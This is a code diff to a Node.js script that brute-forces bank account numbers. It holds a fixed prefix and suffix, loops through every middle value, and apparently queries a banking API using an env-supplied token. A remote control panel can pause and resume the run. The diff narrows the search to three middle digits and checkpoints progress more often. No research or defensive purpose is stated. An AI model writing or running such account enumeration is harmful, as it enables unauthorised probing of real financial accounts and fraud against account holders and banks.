@@ -20,8 +20,9 @@ const BANK_CODE = process.env.BANK_CODE;
 const API_URL = process.env.API_URL;
 const TOKEN = process.env.API_TOKEN;
 
+// Fixed parts of the account number
 const PREFIX = '069';
-const SUFFIX = '471';
+const SUFFIX = '9471';
 
 let start = 0;
 let stop = false;
@@ -36,15 +37,15 @@ controlRef.child('status').on('value', snapshot => {
 });
 
 async function bruteForce() {
-  console.log(chalk.green(`\n🚀 Starting from middle: ${start.toString().padStart(4, '0')}`));
-  for (let i = start; i <= 9999; i++) {
+  console.log(chalk.green(`\n🚀 Starting from middle: ${start.toString().padStart(3, '0')}`));
+  for (let i = start; i <= 999; i++) {
     if (stop) {
       console.log(chalk.yellow('⏸️ Stopped by control panel.'));
       saveState(i);
       break;
     }
 
-    const middle = i.toString().padStart(4, '0');
+    const middle = i.toString().padStart(3, '0');
     const accountNumber = `${PREFIX}${middle}${SUFFIX}`;
     const timestamp = new Date().toISOString();
 
@@ -68,7 +69,7 @@ async function bruteForce() {
       i--;
     }
 
-    if (i % 100 === 0) saveState(i);
+    if (i % 50 === 0) saveState(i);
   }
   console.log(chalk.blueBright('\n🎯 Brute-force finished.'));
 }
